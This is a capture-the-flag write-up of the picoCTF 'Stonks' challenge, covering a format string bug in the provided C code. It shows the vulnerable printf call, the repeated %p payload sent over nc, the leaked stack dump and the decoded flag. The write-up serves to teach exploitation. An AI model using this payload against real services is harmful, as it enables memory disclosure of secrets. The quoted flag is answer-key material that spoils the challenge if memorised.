## Description

>I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you >if you told me it's unsecure! vuln.c nc mercury.picoctf.net 27912

For this CTF I first looked at the given c file 'vuln.c'. I noticed pretty quickly that the file had chosen to printf a `user_buf` straight from the stack instead of using any kind of format string.

```	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);
```

I remembered from my malware analysis class that you could use this vulnerability to print out addresses that were on the stack, and if you looked a little higher up, inside the same function we have: 

```char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);
  ```
  Which means that the api_buf is probably still on the stack.
  
  So, let's talk to the server with the given ```nc mercury.picoctf.net 27912``` command.
  
  I recieved this in response:
  
  > Welcome back to the trading app!What would you like to do?\
  > 1) Buy some stonks!
  > 2) View my portfolio

After choosing option 1, I recieved this in response:

>Using patented AI algorithms to buy stonks
>Stonks chosen
>What is your API token?

This is where our printf(usr_buf) is judging by the source code, so I respond with 
```%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p```
and sure enough, I get this in response:
```0x82ac3b00x804b0000x80489c30xf7f4cd800xffffffff0x10x82aa1600xf7f5a1100xf7f4cdc7(nil)0x82ab1800x50x82ac3900x82ac3b00x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f79336e0x326663310x306131300xffa2007d0xf7f87af80xf7f5a4400x808da8000x1(nil)0xf7de9ce9```

Well the hex addresses between the two `(nil)` symbols look interesting...

Sure enough after converting them from hex to ascii then moving them around a little bit, I was able to get the key: picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}





  
  
